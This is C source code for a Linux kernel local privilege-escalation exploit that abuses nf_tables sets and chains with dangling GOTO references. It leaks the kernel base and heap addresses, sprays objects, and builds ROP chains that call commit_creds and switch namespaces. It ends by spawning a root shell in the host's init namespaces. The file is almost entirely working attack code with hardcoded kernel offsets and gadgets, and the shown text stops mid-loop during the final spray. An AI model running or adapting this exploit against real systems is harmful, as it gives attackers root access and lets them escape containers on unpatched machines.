#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <net/if.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <linux/rtnetlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/set.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include "netlink_utils.h"

// 0xffffffff81103dc0 T find_task_by_vpid
// 0xffffffff8110b570 T switch_task_namespaces
// 0xffffffff8110cf50 T commit_creds
// 0xffffffff83261f00 init_nsproxy
// 0xffffffff83262140 init_cred
// 0xffffffff82001106 <swapgs_restore_regs_and_return_to_usermode+54>:	mov    rdi,rsp

uint64_t find_task_by_vpid_off = 0x103dc0;
uint64_t switch_task_namespaces_off = 0x10b570;
uint64_t commit_creds_off = 0x10cf50;
uint64_t init_nsproxy_off = 0x2261f00;
uint64_t init_cred_off = 0x2262140;
uint64_t swapgs_restore_regs_and_return_to_usermode_off = 0x1001106;
uint64_t nft_last_ops_off = 0x18c9860;

// 0xffffffff81e33229 : push rbx ; and byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; jmp 0xffffffff82204300
// 0xffffffff810380b3 : pop rdi ; jmp 0xffffffff82204300
// 0xffffffff81008003 : pop rsi ; jmp 0xffffffff82204300
// 0xffffffff8102c691 : mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; jmp 0xffffffff82204300
// 0xffffffff810180d6 : pop rsp ; jmp 0xffffffff82204300
// 0xffffffff8116808c : pop r12 ; pop r13 ; jmp 0xffffffff82204300

uint64_t push_rbx_pop_rsp = 0xe33229;
uint64_t pop_rdi_ret = 0x0380b3;
uint64_t pop_rsi_ret = 0x008003;
uint64_t mov_rdi_rax_ret = 0x02c691;
uint64_t pop_rsp_ret = 0x0180d6;
uint64_t pop_r12_pop_r13_ret = 0x16808c;

uint64_t nft_last_ops = 0;
uint64_t kbase = 0;
uint64_t heap_addr1 = 0;
uint64_t heap_addr2 = 0;

struct mnl_socket * nl;
uint32_t portid;

void write_file(const char *filename, char *text) {

    int fd = open(filename, O_RDWR | O_CREAT, 0600);

    write(fd, text, strlen(text));
    close(fd);
}

void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    unshare(CLONE_NEWUSER | CLONE_NEWNS);

    unshare(CLONE_NEWNET);

    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

/*
 *	Add a network interface.
 *	Equivalent to `ip link add ...`.
 */
int net_if(char *type, int n, int opt, bool change) {

	struct nlmsghdr *msg;
	struct nlattr *opts;
	struct ifinfomsg ifinfo = {};
	char name[0x100] = { 0 };
	int sk;

	strcpy(name, type);

	if (n >= 0)
		snprintf(name, sizeof(name), "%s-%d", type, n);

	// Initalize a netlink socket and allocate a nlmsghdr
	sk = nl_init_request(RTM_NEWLINK, &msg, NLM_F_REQUEST|NLM_F_CREATE);
	if (!sk) {
		perror("nl_init_request()");
		return -1;
	}

    ifinfo.ifi_family = AF_UNSPEC;
    ifinfo.ifi_type = PF_NETROM;
    ifinfo.ifi_index = 0;
    ifinfo.ifi_flags = opt;
    ifinfo.ifi_change = change ? 1 : 0;

    nlmsg_append(msg, &ifinfo, sizeof(ifinfo), NLMSG_ALIGNTO);

    nla_put_string(msg, IFLA_IFNAME, name);
    opts = nla_nest_start(msg, IFLA_LINKINFO);
    nla_put_string(msg, IFLA_INFO_KIND, type);
    nla_nest_end(msg, opts);

	// Send the netlink message and deallocate resources
	return nl_complete_request(sk, msg);
}

void pwn(){
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    exit(0);
}

uint64_t _user_rip = (uint64_t) pwn;
uint64_t _user_cs = 0;
uint64_t _user_rflags = 0;
uint64_t _user_sp = 0;
uint64_t _user_ss = 0;

void save_state(void) {
	__asm__(".intel_syntax noprefix;"
	"mov _user_cs, cs;"
	"mov _user_ss, ss;"
	"mov _user_sp, rsp;"
	"pushf;"
	"pop _user_rflags;"
	".att_syntax");
	return;
}

#define TRIG_HOST "127.0.0.1"
#define TRIG_PORT 1337

/* Connect to a server in a specific port to trigger netfilter hooks */
void trig_net_sock(void) {
	int sockfd = 00;
	struct sockaddr_in servaddr, cli;
	
	bzero(&servaddr, sizeof(servaddr));
	bzero(&cli, sizeof(cli));
	
	printf("[*] Connecting to 127.0.0.1:%d...\n", TRIG_PORT);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd == -1)
		printf("[-] Socket creation failed");

	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(TRIG_HOST);
	servaddr.sin_port = htons(TRIG_PORT);

	if(connect(sockfd, (struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
		printf("[-] Connection with server failed");

	write(sockfd, "AAAA", 4);

	close(sockfd);
	
	return;
}

/* Set up a server to receive hook-triggering output packets */
void setup_trig_server(void) {
	int sfd = 0, sock = 0;
	struct sockaddr_in address;
	int opt = 1;
	int addrlen = sizeof(address);
	char buffer[1024] = { 0 };

	if((sfd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
		printf("[-] Error at socket()");

	if(setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
		printf("[-] Error at setsockopt()");

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(TRIG_PORT);

	if(bind(sfd, (struct sockaddr*)&address,  sizeof(address)) < 0)
		printf("[-] Error at bind()");

	if(listen(sfd, 3) < 0)
		printf("[-] Error at listen()");

	if((sock = accept(sfd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0)
		printf("[-] Error at accept()");

	read(sock, buffer, 4);

	sleep(3);

	close(sock);
	close(sfd);

	return;
}

char * table1_name = "table1";

char * set1_name = "set1";
char * set2_name = "set2";

char * chain1_name = "chain1";
char * chain2_name = "chain2";
char * chain3_name = "chain3_123412341234";
char * chain4_name = "chain4_1234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234";

uint8_t family = NFPROTO_IPV4;
uint32_t set_id = 1337;

void make_payload2(uint64_t* data){
    int i = 0;

    // find_task_by_vpid(1)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 1;
    data[i++] = kbase + find_task_by_vpid_off;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + mov_rdi_rax_ret;
    data[i++] = 0;

    data[i++] = kbase + pop_rsi_ret;
    data[i++] = kbase + init_nsproxy_off;
    data[i++] = kbase + switch_task_namespaces_off;

    data[i++] = kbase + swapgs_restore_regs_and_return_to_usermode_off;
    data[i++] = 0;                  // rax
    data[i++] = 0;                  // rdx
    data[i++] = _user_rip;          // user_rip
    data[i++] = _user_cs;           // user_cs
    data[i++] = _user_rflags;       // user_rflags
    data[i++] = _user_sp;           // user_sp
    data[i++] = _user_ss;           // user_ss
}

void make_payload(uint64_t* data){
    int i = 0;

    data[i++] = kbase + push_rbx_pop_rsp;
    data[i++] = kbase + pop_r12_pop_r13_ret;
    data[i++] = 0xffff | ((unsigned long) 0x8 << 44);
    data[i++] = heap_addr2;

    // commit_creds(&init_cred)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = kbase + init_cred_off;
    data[i++] = kbase + commit_creds_off;

    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 0;

    data[i++] = kbase + pop_rsp_ret;
    data[i++] = heap_addr1+0x20;
}

#define TABLE_SPRAY 0x200
#define SET_SPRAY 0x100

void spray_set_last_expr(int id){
    int set_ksize = 64;
    char *set_name;

    asprintf(&set_name, "s_set%02hx", id);

    struct nftnl_set * set_leak =  nftnl_set_alloc();

    nftnl_set_set_str(set_leak, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set_leak, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_leak, NFTNL_SET_FLAGS, 0);
    nftnl_set_set_u32(set_leak, NFTNL_SET_KEY_LEN, set_ksize);
    nftnl_set_set_u32(set_leak, NFTNL_SET_KEY_TYPE, 13);
    nftnl_set_set_u32(set_leak, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_leak, NFTNL_SET_ID, id);

    struct nftnl_expr * expr_last = nftnl_expr_alloc("last");
    nftnl_set_add_expr(set_leak, expr_last);

    size_t buf_size = MNL_SOCKET_BUFFER_SIZE * 100;
    char *buf = malloc(buf_size);

    struct mnl_nlmsg_batch * batch;
    int seq = 0;
    struct nlmsghdr * nlh;

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), 
                                NFT_MSG_NEWSET, family, NLM_F_CREATE, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_leak);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }
}

int trig(){
    struct nftnl_table * table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table1_name);
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    uint32_t set1_id = 1337, set2_id = 1338;
    int set_ksize = 8;
    uint8_t desc_concat[20] = {0,};
    desc_concat[0] = 2;
    desc_concat[1] = 2;

    struct nftnl_set * set1 =  nftnl_set_alloc();

    nftnl_set_set_str(set1, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set1, NFTNL_SET_NAME, set1_name);
    nftnl_set_set_u32(set1, NFTNL_SET_FLAGS,  NFT_SET_CONCAT | NFT_SET_INTERVAL | NFT_SET_TIMEOUT | NFT_SET_MAP);
    nftnl_set_set_u32(set1, NFTNL_SET_KEY_LEN, set_ksize);
    nftnl_set_set_u32(set1, NFTNL_SET_KEY_TYPE, 13);
    nftnl_set_set_u32(set1, NFTNL_SET_ID, set1_id);
    nftnl_set_set_u32(set1, NFTNL_SET_DESC_SIZE, 1);
    nftnl_set_set_u32(set1, NFTNL_SET_DATA_TYPE, NFT_DATA_VERDICT);
    nftnl_set_set_data(set1, NFTNL_SET_DESC_CONCAT, desc_concat, 10);
    nftnl_set_set_u32(set1, NFTNL_SET_GC_INTERVAL, 1);

    struct nftnl_set * set1_elem =  nftnl_set_alloc();

    nftnl_set_set_str(set1_elem, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set1_elem, NFTNL_SET_NAME, set1_name);

    struct nftnl_set_elem * elem1 = nftnl_set_elem_alloc();

    nftnl_set_elem_set_u32(elem1, NFTNL_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL);
    nftnl_set_elem_set_str(elem1, NFTNL_SET_ELEM_CHAIN, chain3_name);
    nftnl_set_elem_set_u32(elem1, NFTNL_SET_ELEM_VERDICT, NFT_GOTO);
    nftnl_set_elem_set_u64(elem1, NFTNL_SET_ELEM_TIMEOUT, 1);

    nftnl_set_elem_add(set1_elem, elem1);

    struct nftnl_set * set2 =  nftnl_set_alloc();

    nftnl_set_set_str(set2, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set2, NFTNL_SET_NAME, set2_name);
    nftnl_set_set_u32(set2, NFTNL_SET_FLAGS,  NFT_SET_CONCAT | NFT_SET_INTERVAL | NFT_SET_TIMEOUT | NFT_SET_MAP);
    nftnl_set_set_u32(set2, NFTNL_SET_KEY_LEN, set_ksize);
    nftnl_set_set_u32(set2, NFTNL_SET_KEY_TYPE, 13);
    nftnl_set_set_u32(set2, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set2, NFTNL_SET_ID, set2_id);
    nftnl_set_set_u32(set2, NFTNL_SET_DESC_SIZE, 1);
    nftnl_set_set_u32(set2, NFTNL_SET_DATA_TYPE, NFT_DATA_VERDICT);
    nftnl_set_set_data(set2, NFTNL_SET_DESC_CONCAT, desc_concat, 10);
    nftnl_set_set_u32(set2, NFTNL_SET_GC_INTERVAL, 1);

    struct nftnl_set * set2_elem =  nftnl_set_alloc();

    nftnl_set_set_str(set2_elem, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set2_elem, NFTNL_SET_NAME, set2_name);

    struct nftnl_set_elem * elem2 = nftnl_set_elem_alloc();

    nftnl_set_elem_set_u32(elem2, NFTNL_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL);
    nftnl_set_elem_set_str(elem2, NFTNL_SET_ELEM_CHAIN, chain4_name);
    nftnl_set_elem_set_u32(elem2, NFTNL_SET_ELEM_VERDICT, NFT_GOTO);
    nftnl_set_elem_set_u64(elem2, NFTNL_SET_ELEM_TIMEOUT, 1);
    nftnl_set_elem_add(set2_elem, elem2);

    struct nftnl_chain * chain1 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_TABLE, table1_name);
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_NAME, chain1_name);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_FLAGS, 0);
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_TYPE, "filter");
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_OUT);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_PRIO, 10);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_POLICY, NF_ACCEPT);

    struct nftnl_chain * chain2 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain2, NFTNL_CHAIN_TABLE, table1_name);
    nftnl_chain_set_str(chain2, NFTNL_CHAIN_NAME, chain2_name);
    nftnl_chain_set_u32(chain2, NFTNL_CHAIN_FLAGS, 0);


    struct nftnl_chain * chain3 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain3, NFTNL_CHAIN_TABLE, table1_name);
    nftnl_chain_set_str(chain3, NFTNL_CHAIN_NAME, chain3_name);
    nftnl_chain_set_u32(chain3, NFTNL_CHAIN_FLAGS, 0);

    struct nftnl_chain * chain4 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain4, NFTNL_CHAIN_TABLE, table1_name);
    nftnl_chain_set_str(chain4, NFTNL_CHAIN_NAME, chain4_name);
    nftnl_chain_set_u32(chain4, NFTNL_CHAIN_FLAGS, 0);

    struct nftnl_rule * rule_dangling_3 = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_dangling_3, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_dangling_3, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u32(rule_dangling_3, NFTNL_RULE_FAMILY, family);

    struct nftnl_expr * expr_immediate = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(expr_immediate, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(expr_immediate, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    nftnl_expr_set_str(expr_immediate, NFTNL_EXPR_IMM_CHAIN, chain3_name);
    nftnl_rule_add_expr(rule_dangling_3, expr_immediate);

    struct nftnl_rule * rule_dangling_4 = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_dangling_4, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_dangling_4, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u32(rule_dangling_4, NFTNL_RULE_FAMILY, family);

    expr_immediate = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(expr_immediate, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(expr_immediate, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    nftnl_expr_set_str(expr_immediate, NFTNL_EXPR_IMM_CHAIN, chain4_name);
    nftnl_rule_add_expr(rule_dangling_4, expr_immediate);

    struct nftnl_rule * rule_dummy = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_dummy, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_dummy, NFTNL_RULE_CHAIN, chain2_name);

    size_t buf_size = MNL_SOCKET_BUFFER_SIZE * 100;
    char *buf = malloc(buf_size);
    int ret;
    char read_data[0x1000] = {0,};

    struct mnl_nlmsg_batch * batch;
    int seq = 0;
    struct nlmsghdr * nlh;

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    ret = mnl_socket_recvfrom(nl, read_data, 0x1000);

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, 0, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain4);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, 0, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain3);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, 0, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain2);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, 0, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain1);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_dangling_3);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_dangling_4);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, family, NLM_F_CREATE, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set1);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, family, NLM_F_CREATE, seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set1_elem);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELSET, family, 0, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set1);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0 ; i < 0xa00; i++){
        nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE, seq++);
        nftnl_rule_nlmsg_build_payload(nlh, rule_dummy);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    usleep(100*1000);

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, family, 0, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain3);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    usleep(200*1000);

    // leak kaslr
    for(int i = 0 ; i < SET_SPRAY; i++)
        spray_set_last_expr(i);

    struct nftnl_rule *rule_get = nftnl_rule_alloc();
    nftnl_rule_set_str(rule_get, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_get, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u64(rule_get, NFTNL_RULE_HANDLE, 0x5);

    nlh = nftnl_rule_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family, NLM_F_DUMP | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_get);
    nftnl_rule_free(rule_get);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    ret = mnl_socket_recvfrom(nl, read_data, 0x400);

    if (ret > 0) {
        nft_last_ops = *(unsigned long*) &read_data[0x170];
        kbase = nft_last_ops - nft_last_ops_off;
        ret = mnl_socket_recvfrom(nl, read_data, 0x200);
    }

    printf("[*] kbase %lx nft_last_ops %lx\n", kbase, nft_last_ops);

    if(nft_last_ops == 0){
        printf("[-] kaslr leak failed..\n");
        return -1;
    }

    usleep(10*1000);

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, family, NLM_F_CREATE, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set2);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, family, NLM_F_CREATE, seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set2_elem);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0 ; i < 0xa00; i++){
        nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE, seq++);
        nftnl_rule_nlmsg_build_payload(nlh, rule_dummy);
        mnl_nlmsg_batch_next(batch);
    }

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELSET, family, 0, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set2);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, family, 0, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain4);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    usleep(200*1000);

    char rule_data[0x400] = {0,};
    memset(rule_data, 'b', 0x400);

    struct nftnl_rule * rule_spray2 = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_spray2, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_spray2, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u32(rule_spray2, NFTNL_RULE_FAMILY, family);
    nftnl_rule_set_data(rule_spray2, NFTNL_RULE_USERDATA, rule_data, 96-25);

    memset(rule_data, 'c', 0x400);

    make_payload2((uint64_t*)(rule_data+7));

    // Spray rule
    struct nftnl_rule * rule_spray = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_spray, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_spray, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u32(rule_spray, NFTNL_RULE_FAMILY, family);
    nftnl_rule_set_data(rule_spray, NFTNL_RULE_USERDATA, rule_data, 192-25);

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_spray2);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0; i < 4; i++){
        nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE, seq++);
        nftnl_rule_nlmsg_build_payload(nlh, rule_spray);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    usleep(10*1000);

    // Leak heap
    memset(read_data, 0, 0x1000);

    rule_get = nftnl_rule_alloc();
    nftnl_rule_set_str(rule_get, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_get, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u64(rule_get, NFTNL_RULE_HANDLE, 0x6);

    nlh = nftnl_rule_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family, NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_get);
    nftnl_rule_free(rule_get);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    ret = mnl_socket_recvfrom(nl, read_data, 0x400);

    if (ret > 0) {
        heap_addr1 = *(unsigned long*) &read_data[0x78];
        heap_addr2 = *(unsigned long*) &read_data[0x70];
        ret = mnl_socket_recvfrom(nl, read_data, 0x200);
    }

    printf("[*] heap_addr %lx %lx\n", heap_addr1, heap_addr2);

    if((heap_addr1 & 0xffff000000000000) != 0xffff000000000000){
        printf("[-] heap leak failed..\n");
        return -1;
    }

    // Spray ROP payload
    struct nftnl_rule * rule_del = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_del, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_del, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u64(rule_del, NFTNL_RULE_HANDLE, 0x1509);

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELRULE, family, 0, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_del);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    usleep(100*1000);

    struct nftnl_table * tables[TABLE_SPRAY] = {0,};

    uint64_t *data = malloc(1024);
    memset(data, 'd', 1024);

    make_payload(data);

    for(int i = 0; i < TABLE_SPRAY; i++){
        char *table_name;
        asprintf(&table_name, "st96_%02hx", i);

        struct nftnl_table * table = nftnl_table_alloc();
        nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
        nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);
